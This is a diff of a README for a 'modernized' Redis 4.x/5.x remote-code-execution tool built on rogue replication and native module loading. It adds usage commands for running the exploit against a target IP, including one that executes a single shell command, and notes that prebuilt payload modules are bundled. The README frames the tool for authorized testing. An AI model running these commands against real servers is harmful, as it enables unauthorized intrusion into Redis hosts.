@@ -1,5 +1,59 @@
-# Redis-RCE
-### remote code execute for redis4 and redis5
+# Redis-RCE Modernized
+
+A maintained, reusable version of the Redis 4.x/5.x rogue-replication module
+loading technique for authorized labs and security assessments.
+
+> Use only against systems you own or have explicit permission to test. The
+> tool changes Redis replication and configuration temporarily and loads native
+> code into the Redis process.
+
+## Modernized usage
+
+For authorized lab testing, the common case now only needs a target:
+
+```bash
+python3 redis-rce.py -r 192.168.168.93
+```
+
+The script automatically detects the callback IP from the route, tries likely
+callback ports, tries `/dev/shm`, `/tmp`, `/var/tmp`, and the configured Redis
+directory, uses a unique remote filename, and restores the original Redis
+directory and database filename during cleanup.
+
+Useful modes:
+
+```bash
+# Read-only fingerprint
+python3 redis-rce.py -r 192.168.168.93 --check
+
+# One command, then cleanup
+python3 redis-rce.py -r 192.168.168.93 -c id
+
+# Explicit overrides when auto-detection is unsuitable
+python3 redis-rce.py -r 192.168.168.93 -L 192.168.45.182 \
+  -P 6379,6380 -d /dev/shm -f ./exp_lin.so
+```
+
+The bundled Linux module is x86-64. Supply a compatible module with `-f` for
+other target architectures.
+
+The repository includes `exp_lin.so` and `exp_osx.so` from the upstream
+project so a separate payload download is not required.
+
+## Credits and provenance
+
+This is a modernization of [Ridter/redis-rce](https://github.com/Ridter/redis-rce),
+obtained through the [jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)
+repository whose Git history is retained here.
+
+The command-execution Redis module is based on
+[RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand).
+The rogue-replication technique is documented in the included ZeroNights 2018
+presentation, [Redis post-exploitation](./15-redis-post-exploitation.pdf).
+
+No explicit license file was present in the upstream repository at the time of
+this modernization. Original code, binaries, images, and presentation material
+remain attributable to their respective authors.
 
 
 #### python code from https://github.com/Ridter/redis-rce
